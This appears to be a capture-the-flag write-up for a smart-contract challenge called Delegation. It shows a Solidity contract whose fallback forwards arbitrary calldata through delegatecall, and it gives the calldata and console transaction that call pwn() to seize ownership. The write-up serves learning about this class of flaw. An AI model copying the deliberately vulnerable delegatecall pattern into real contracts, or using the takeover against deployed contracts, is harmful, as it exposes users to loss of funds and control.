# Delegation

Source:

```
contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

The `fallback()` function will be called when we send a transaction and the calldata does not match any function.

`delegatecall(msg.data)` will redirect our calldata to the Delegate contract, allowing us to call any function in Delegate.

You can craft calldata easily with the cast cli tool from Foundry `cast calldata "function pwn()"`

simply sending through the console `await contract.sendTransaction({data: "0xdd365b8b"})` allows us to call the `pwn()` function and takeover the contract.

`delegatecall()` basically means "Hey delegate contract, do whatever you want with my state :D"
